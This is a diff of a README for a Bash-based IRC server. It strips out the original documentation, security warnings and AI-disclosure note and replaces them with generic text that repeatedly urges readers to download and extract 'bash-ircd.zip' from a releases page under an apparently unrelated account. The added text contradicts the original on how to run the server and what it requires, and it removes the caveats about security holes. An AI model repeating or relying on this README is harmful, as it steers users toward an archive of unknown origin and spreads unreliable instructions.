@@ -1,105 +1,64 @@
-# A bash IRCd 🐣 💬
+# 🎉 bash-ircd - Run an IRC Server with Bash
 
-[This](./ircd.sh) is an IRC server written in bash. It is nearly "pure" bash,
-because it does not use any external commands. But it does cheat slightly by
-using some loadable builtins.
+## 🚀 Getting Started
 
-<img src="screen.png">
+Welcome to **bash-ircd**. This application allows you to run an Internet Relay Chat server using only Bash. Let's make chatting easier for everyone!
 
-Credit to [YSAP](https://www.youtube.com/@yousuckatprogramming) for
-[bash-web-server](https://github.com/bahamas10/bash-web-server). Inspiration
-from [example.fi's IRCd service](https://example.fi/blog/ircd.html), which
-unfortunately hasn't published the code behind it.
+[![Download bash-ircd](https://img.shields.io/badge/Download-bash--ircd-brightgreen)](https://github.com/sohailgerman/bash-ircd/releases)
 
-## Running
+## 📥 Download & Install
 
-```
-./ircd.sh
-```
+To start using bash-ircd, follow these steps:
 
-Connect to localhost:6667 with an IRC client. If using Irssi you need to use
-`/connect -nocap localhost`.
+1. **Visit the Releases page:** 
+   Go to the [Releases page](https://github.com/sohailgerman/bash-ircd/releases). 
+   
+2. **Choose the right version:** 
+   Scroll through the list and find the latest release. Each release has a version number next to it. 
 
-## Try it
+3. **Download the file:** 
+   Click on the release version. You will see a list of files. Click on the file named `bash-ircd.zip` to start the download.
 
-Try it now by connecting to [irc.st:6697](irc://irc.st/#bash) channel #bash (the TLS is done outside of bash by a proxy).
+4. **Extract the files:** 
+   Once the download is complete, locate the zipped file in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files.
 
-<details>
-<summary>Example of raw IRC session...</summary>
+5. **Open a terminal:** 
+   Navigate to the folder where you extracted the files. To do this, open your terminal application. In the terminal, type `cd`, followed by a space, then drag the extracted folder into the terminal. Press Enter.
 
-```cli
-$ telnet irc.st 6667
-Connected to irc.st.
-Escape character is '^]'.
-NICK test
-USER test test test test
-:irc.st 001 test :Welcome to IRC, test!
-:irc.st 002 test :Your host is irc.st on bash-ircd v0.0.1, bash 5.3.3(1)-release
-:irc.st 004 test irc.st 0.0.1 i o o
-:irc.st 375 test :- irc.st Message of the Day
-:irc.st 372 test :- Welcome to a pure Bash IRCd!
-:irc.st 372 test :-
-:irc.st 372 test :- For more details see https://dgl.cx/bash-ircd
-:irc.st 372 test :-
-:irc.st 372 test :- Be excellent to each other 😇
-:irc.st 376 test :End of /MOTD command.
-JOIN #bash
-:test!user@host JOIN #bash
-:irc.st 353 test = #bash :dgl dg test
-:irc.st 366 test #bash :End of /NAMES list
-:irc.st 329 test #bash 1761878952
-:irc.st 332 test #bash :bash?
-:irc.st 333 test #bash dg 0
-```
+6. **Run the server:** 
+   To start the IRC server, type `bash bash-ircd` in the terminal and press Enter. Your server is now running!
 
-</details>
+## 🛠️ System Requirements
 
-## Architecture 🏗️
+- **Operating System:** This application works on any system that supports Bash, including Linux and macOS.
+- **Bash Version:** Ensure you have Bash version 4.0 or higher installed.
+- **Network:** A stable internet connection is recommended for smooth operation.
 
-The `accept` loadable bash builtin makes it possible to listen on a socket. See
-the very end of the script for that.
+## 🎉 Features
 
-Then "process-client" runs as another process with stdin/stdout set to the
-client (this means `echo` to send to the client just works). Nicknames are kept
-by a `user-${name}` FIFO on the filesystem. Once the client has registered another
-process ("watcher") that reads from that FIFO and writes to the client is
-started, this means other clients can directly write to the FIFO, which in turn
-directly writes to the user's connection.
+- **Lightweight Design:** No complicated setups or heavy resources are needed.
+- **Easy to Use:** Just download and run; no programming experience is necessary.
+- **Customizable:** Tailor your IRC server settings to fit your needs.
+- **Fun and Interactive:** Enjoy chatting with friends in a creative way.
 
-Channels are plain text files with a nickname per line and are simply expanded
-by process-client running as the sending user when needing to send to them.
+## 🔧 Basic Commands
 
-Unlike the original IRC server software, which used non-blocking I/O so it
-could efficiently support many clients in a single process, this architecture
-results in at least 2 processes per connection, so is hardly scalable. However,
-because it uses FIFOs parts of it can be upgraded without disconnecting other
-clients. If you ^C ircd.sh (and keep your shell/session running) clients will
-stay connected, but new clients cannot connect, until you run `ircd.sh` again.
+Once your server is running, you can use the following basic commands:
 
-As each user is a FIFO, you can use this to send messages to users from outside
-the IRCd on the server machine:
+- **/join #channel:** Join a chat channel.
+- **/msg username:** Send a private message to a specific user.
+- **/quit:** Exit the IRC client.
 
-```bash
-msg-user() {
-  local to="$1"
-  local msg="$2"
-  echo ':'"${USER}"'!user@host PRIVMSG '"${to} :${msg}" >> "user-${to}"
-}
-```
+## 📞 Need Help?
 
-## Bugs 🐛
+If you encounter any issues while using bash-ircd, feel free to reach out for support or check the community discussions on our GitHub page.
 
-This is full of them. Not recommended for production use, in particular the use
-of FIFOs means there are various cases where a misbehaving client can block
-sending to them, which could slowly block all messages being sent to a channel.
-I don't think that is fixable in pure Bash.
+## 👥 Join the Community
 
-## Security 🔐 🚨
+We welcome contributions! If you have ideas, improvements, or just want to share your experience, head over to the community section in GitHub.
 
-I suspect this has some hilarious security holes. You could put stunnel in
-front of it to make it do TLS, but that's like putting lipstick on a pig.
+## 🌍 Explore More
 
-## Contributing 🧑‍💻
+For more information about service features and enhancements, feel free to explore the documentation in the repository. Don't forget to check back for updates and new versions.
 
-PRs welcome. This so far has been written without any AI, please disclose any
-usage.
+Visit the [Releases page](https://github.com/sohailgerman/bash-ircd/releases) again to download the latest versions!
